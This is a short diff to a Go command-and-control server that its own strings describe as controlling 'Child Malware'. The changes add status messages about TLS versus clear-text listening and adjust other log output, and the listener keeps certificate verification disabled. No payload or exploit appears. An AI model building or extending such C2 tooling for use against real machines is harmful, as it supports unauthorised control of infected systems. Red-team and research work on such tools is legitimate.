@@ -188,7 +188,7 @@ func connectTLS() net.Conn {
 
 	if *commands != "" {
 		fmt.Println("Go C2 will run in Command List Mode")
-		fmt.Println("Please note, Command List Mode does not use TLS")
+
 		fmt.Println("Admin interface will listen on: ", *connect)
 		fmt.Println("Connect the Child Malware to: ", *connect)
 
@@ -200,14 +200,15 @@ func connectTLS() net.Conn {
 	}
 
 	if *tlsOn == true {
-
+		fmt.Println("TLS mode enabled: Using TLS")
 		cert, err := tls.LoadX509KeyPair("../openssl/mydomain.com.crt", "../openssl/mydomain.com.key")
 		checkError(err)
 		config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
 
 		l, _ = tls.Listen("tcp", *connect, &config)
 
-	} else {
+	} else if *tlsOn == false {
+		fmt.Println("TLS not enabled, using clear text")
 		l, _ = net.Listen("tcp", *connect)
 		// checkError(err)
 		// if err != nil {
@@ -215,7 +216,8 @@ func connectTLS() net.Conn {
 
 		// }
 	}
-	fmt.Println("===ADMIN SERVER LISTENING ===")
+	fmt.Println("#===ADMIN SERVER LISTENING ===")
+	fmt.Println("===Waiting for Client to connect")
 	defer l.Close()
 
 	c, _ = l.Accept()
